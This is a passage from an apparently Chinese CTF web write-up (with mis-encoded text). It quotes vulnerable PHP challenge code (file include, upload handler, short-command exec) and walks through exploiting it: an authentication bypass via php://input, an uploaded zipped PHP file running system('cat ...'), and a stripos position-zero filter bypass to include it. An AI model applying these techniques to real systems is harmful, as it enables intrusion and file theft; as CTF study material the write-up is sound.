(<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;://f&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ://f ://f ://f&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;ata&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ata ata ata&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no 0 0 0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;File is not exit &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$adfile</span>, <span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//Only Administrators can download files .</span></span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$adfile</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$adfile</span>, <span class="string">&#x27;r&#x27;</span>) === <span class="string">&#x27;Yeah Everything Will Be Ok My Boss&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome ! You Are Administrator !&quot;</span>;</span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cert</span> === <span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="string">&#x27;file_list&#x27;</span>) != <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&#x27;error4&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="string">&#x27;file_list&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Description: File Transfer&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span>. <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>));</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Expires: 0&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Pragma: public&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>));</span><br><span class="line">      <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;error3&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$page</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;no ./ ./ ./ ./&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$page</span>, <span class="string">&#x27;://&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;no :// :// ://&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">autoload</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[admin]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[file])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[admin], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>  <span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[file], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;not flag flag flag falg !&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[file]) &gt;= <span class="number">38</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">download</span>(<span class="variable">$_GET</span>[admin], <span class="variable">$_GET</span>[file]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‡Œé¢æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½çš„å‡½æ•°,åªæœ‰é€šè¿‡äº†è®¤è¯æ‰å¯ä»¥ä¸‹è½½,ç„¶åè®¤è¯çš„éƒ¨åˆ†æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$adfile</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$adfile</span>, <span class="string">&#x27;r&#x27;</span>) === <span class="string">&#x27;Yeah Everything Will Be Ok My Boss&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome ! You Are Administrator !&quot;</span>;</span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»•è¿‡ç›´æ¥ç”¨php://inputå°±å¯ä»¥äº†,ç„¶åé€šè¿‡fileå‚æ•°æ¥ä¸‹è½½upload.php é¡ºåˆ©æ‹¿åˆ°upload.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="comment">//properties of the uploaded file</span></span><br><span class="line">    <span class="variable">$name</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$type</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="variable">$size</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line">    <span class="variable">$temp</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$error</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;error&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">6</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;name is too long !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$name</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;invalid parameter&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$name</span>, <span class="string">&#x27;php&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;invalid parameter&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;zip&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;jpg&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;file can not upload ! &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$error</span> &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Error uploading file! code <span class="subst">$error</span>.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$type</span> !== <span class="string">&quot;application/zip&quot;</span>  <span class="variable">$size</span> &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Format not allowed or file size too big!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;includes&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>, <span class="string">&quot;includes/uploaded/&quot;</span> .<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload complete a!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sh /var/www/html/includes/unzip.sh&#x27;</span>);</span><br><span class="line">          &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;uploaded&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>, <span class="string">&quot;uploaded/&quot;</span> .<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload complete!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sh /var/www/html/includes/unzip.sh&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]) === <span class="number">20</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;lag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27; &#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\d_ -]/si&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_ -]/s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;cat &#x27;</span> . <span class="string">&#x27;uploaded/&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æºç ,balabalaä¸€å¤§å †,å‘ç°å°±æ˜¯å¯ä»¥ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶å˜›,ç„¶ååå­—ä¸èƒ½å¤ªé•¿,ä¼ ä¸Šå»ä¹‹åä¼šè°ƒç”¨ä¸€ä¸ªunzip.sh,è®¿é—®ä¸€ä¸‹http://47.104.188.226:20001/includes/unzip.sh æ‹¿åˆ°äº†unzip.shçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/bash</span></span><br><span class="line">cd ./uploaded</span><br><span class="line">find ./ -size +<span class="number">1</span>M  xargs rm</span><br><span class="line">cd ../</span><br><span class="line">unzip -o ./uploaded<span class="comment">/*.zip -d ./uploaded/</span></span><br><span class="line"><span class="comment">rm -rf ./uploaded/*.zip</span></span><br><span class="line"><span class="comment">rm -rf ./uploaded/*.*</span></span><br><span class="line"><span class="comment">rm -rf ./uploaded/.*</span></span><br><span class="line"><span class="comment">cd ./uploaded</span></span><br><span class="line"><span class="comment">find -type d  xargs rm -rf</span></span><br><span class="line"><span class="comment">touch /var/www/html/includes/uploaded/index.php</span></span><br><span class="line"><span class="comment">chmod 000 /var/www/html/includes/uploaded/index.php</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬ä¼šåˆ é™¤å¸¦.çš„æ–‡ä»¶è€Œä¸”ä¼šåˆ é™¤ç›®å½•æ–‡ä»¶,æœ€ååˆ›å»ºä¸€ä¸ªindex.php,ä½†ä¸ç»™æƒé™ é‚£æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª123,é‡Œé¢å†™ä¸€ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag/flag/flag/flag/flag/flag/flag.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‹ç¼©æˆ1.zip,ä¸Šä¼ ,æŠ“åŒ…æ”¹typeä¸ºapplication/zip,ç„¶åä¸Šä¼ å’Œè§£å‹æˆåŠŸ,ä¹‹åå°±æ˜¯åŒ…å«è¿™ä¸ªæ–‡ä»¶æ‹¿flagäº†,indexé‡Œé¢æœ‰åŒ…å«çš„éƒ¨åˆ†,ä½†æ˜¯é‚£é‡Œå¯¹uploadè¿›è¡Œäº†æ£€æµ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span>(<span class="params"><span class="variable">$page</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;uploaded&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no uploaded uploaded uploaded uploaded !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;://f&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ://f ://f ://f&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;ata&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ata ata ata&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no 0 0 0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;File is not exit &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨çš„æ˜¯stripos,è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡è¢«åŒ¹é…åˆ°çš„ä½ç½®,ä½†æ³¨æ„,å­—ç¬¦ä¸²æ˜¯ä»0å¼€å§‹è®°çš„,æ‰€ä»¥æˆ‘ä»¬æ„é€ ä¸€ä¸ªhttp://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/123 é‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡äº†,åŒ…å«ä¹‹åæ‹¿åˆ°flag å› ä¸ºæ²¡æœ‰ç¯å¢ƒ,éƒ½æ˜¯å‚è€ƒçš„åˆ«äººçš„wp,ä¸»è¦æ˜¯ç†è§£ä¸€ä¸‹å§.... <a href="https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/" title="dalaoåšå®¢çœ‹è¿™é‡Œ">dalaoåšå®¢çœ‹è¿™é‡Œ</a></p><h4 id="è¯·å…³æ³¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿçš„è­¦å‘Šè®°å½•">è¯·å…³æ³¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿçš„è­¦å‘Šè®°å½•</h4><h5 id="å‚ä¸å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè­¦å‘Šè®°å½•çš„æ´»åŠ¨å¯èƒ½å¥–åŠ±ä½ ä¸€ä¸ªflag">å‚ä¸å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè­¦å‘Šè®°å½•çš„æ´»åŠ¨ï¼Œå¯èƒ½å¥–åŠ±ä½ ä¸€ä¸ªflag</h5><h5 id="http47.104.166.18320008">http://47.104.166.183:20008</h5><p>é¢˜ç›®ç»™å‡ºæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;re&#x27;</span>])) &#123;</span><br><span class="line">       <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$selfdir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$selfdir</span>)) &#123;</span><br><span class="line">     <span class="keyword">die</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$secret</span> = <span class="string">&#x27;/var/www/html/hackme/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;cetcrce&quot;</span> . <span class="variable">$selfdir</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">   @<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;hackme&#x27;</span>);</span><br><span class="line">   @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$secret</span>);</span><br><span class="line">   @<span class="title function_ invoke__">chdir</span>(<span class="variable">$secret</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line">       @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">   &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;re&#x27;</span>])) &#123;</span><br><span class="line">       @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$secret</span>);</span><br><span class="line">       @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;touch /var/www/html/hackme/index.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span 